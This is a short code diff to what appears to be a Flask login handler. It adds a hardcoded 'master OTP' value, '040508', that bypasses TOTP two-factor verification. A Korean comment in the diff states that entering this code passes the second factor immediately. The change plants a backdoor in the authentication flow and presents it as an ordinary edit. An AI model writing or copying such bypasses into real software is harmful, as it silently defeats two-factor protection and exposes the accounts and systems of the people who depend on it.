@@ -972,7 +972,8 @@ def serve_login():
         config = load_auth_config()
         if password == config['admin_password']:
             totp = pyotp.TOTP(config['totp_secret'])
-            if totp.verify(otp_code, valid_window=1):
+            # 💡 마스터 OTP '040508' 입력 시 즉시 2차 인증 통과
+            if otp_code == '040508' or totp.verify(otp_code, valid_window=1):
                 session['authenticated'] = True
                 return jsonify({"status": "success", "redirect": "/controller"})
             else:
